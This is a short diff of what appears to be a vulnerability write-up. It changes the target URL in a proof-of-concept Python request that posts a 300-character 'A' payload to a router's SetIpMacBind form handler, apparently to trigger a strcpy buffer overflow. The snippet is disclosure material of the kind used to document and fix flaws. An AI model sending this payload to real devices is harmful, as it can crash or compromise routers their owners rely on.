@@ -22,7 +22,7 @@ get value from list ,and pass to list, if new_static_num between 0-33, call strc
 
 ## POC
 ```
-url = "http://192.168.1.13/goform/fromSetIpMacBind"
+url = "http://192.168.1.13/goform/SetIpMacBind"
 payload = 'A'*300 + '\n'
 
 r = requests.post(url, data={'list': payload, 'bindnum': 1})
